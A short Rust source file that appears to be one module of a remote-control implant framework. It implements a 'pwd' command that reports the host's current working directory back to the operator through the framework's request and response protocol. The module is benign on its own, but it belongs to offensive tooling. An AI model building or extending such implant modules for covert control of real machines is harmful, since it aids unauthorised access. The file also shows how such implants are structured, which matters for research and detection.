use crate::{Module, TaskResult, check_request, Result};
use malefic_proto::proto::modulepb::Response;
use malefic_proto::proto::implantpb::spite::Body;

use async_trait::async_trait;
use malefic_trait::module_impl;



pub struct Pwd {}

#[async_trait]
#[module_impl("pwd")]
impl Module for Pwd {}

#[async_trait]
impl crate::ModuleImpl for Pwd {
    #[allow(unused_variables)]
    async fn run(&mut self, id: u32, receiver: &mut crate::Input, sender: &mut crate::Output) -> Result {
        let _ = check_request!(receiver, Body::Request)?;

        let mut response = Response::default();
        let output = std::env::current_dir()?;
        response.output = output.to_string_lossy().to_string();

        Ok(TaskResult::new_with_body(id, Body::Response(response)))
    }
}
